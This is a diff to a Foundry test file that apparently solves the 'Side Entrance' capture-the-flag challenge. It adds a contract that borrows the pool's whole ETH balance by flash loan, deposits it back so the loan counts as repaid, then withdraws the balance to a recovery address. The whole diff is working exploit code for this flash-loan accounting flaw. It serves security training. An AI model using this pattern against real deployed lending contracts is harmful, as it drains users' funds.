@@ -5,6 +5,34 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
+contract FlashLoanEtherReceiver {
+    SideEntranceLenderPool private immutable i_pool;
+    address private immutable i_owner;
+    address private immutable i_recoveryAddress;
+
+    constructor(address pool, address recovery) {
+        i_pool = SideEntranceLenderPool(pool);
+        i_owner = msg.sender;
+        i_recoveryAddress = recovery;
+    }
+
+    function execute() external payable {
+        i_pool.deposit{value: msg.value}();
+        (bool success,) = address(i_pool).call{value: msg.value}("");
+        (success);
+    }
+
+    receive() external payable {
+        if (msg.sender == i_owner) {
+            i_pool.flashLoan(address(i_pool).balance);
+            i_pool.withdraw();
+        } else {
+            (bool success,) = i_recoveryAddress.call{value: msg.value}("");
+            (success);
+        }
+    }
+}
+
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -44,7 +72,11 @@ contract SideEntranceChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_sideEntrance() public checkSolvedByPlayer {}
+    function test_sideEntrance() public checkSolvedByPlayer {
+        FlashLoanEtherReceiver receiver = new FlashLoanEtherReceiver(address(pool), recovery);
+        (bool success,) = address(receiver).call{value: PLAYER_INITIAL_ETH_BALANCE}("");
+        (success);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
